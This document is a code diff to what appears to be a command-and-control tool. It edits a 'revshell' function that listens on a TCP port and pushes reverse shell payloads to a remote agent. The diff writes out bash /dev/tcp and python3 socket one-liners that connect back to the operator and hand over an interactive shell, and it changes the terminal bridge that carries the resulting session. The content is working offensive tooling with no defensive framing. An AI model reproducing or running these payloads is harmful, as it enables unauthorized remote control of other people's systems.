@@ -56,7 +56,6 @@ def _pty_bridge(conn):
     try:
         tty.setraw(0)
         signal.signal(signal.SIGINT, signal.SIG_IGN)
-        buf = b""
 
         while True:
             r, _, _ = select.select([conn, 0], [], [])
@@ -64,8 +63,7 @@ def _pty_bridge(conn):
                 d = conn.recv(4096)
                 if not d:
                     break
-                cleaned = strip_ansi(d.decode(errors="replace")).encode(errors="replace")
-                os.write(1, cleaned)
+                os.write(1, d)
             if 0 in r:
                 d = os.read(0, 4096)
                 if not d:
@@ -110,10 +108,10 @@ def revshell(manager, agent_id, c2_server):
 
     _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")
 
-    # Fast TCP attempt: just try Python & bash on LAN IP (Cloudflare TCP likely blocked)
+    # Fast TCP attempt
     payloads = [
-        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", "python3 → LAN"),
-        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp → LAN"),
+        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | bash >&3 2>&3'", "bash → LAN"),
+        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh'],os.environ)\"", "python3 → LAN"),
     ]
 
     srv.settimeout(4)
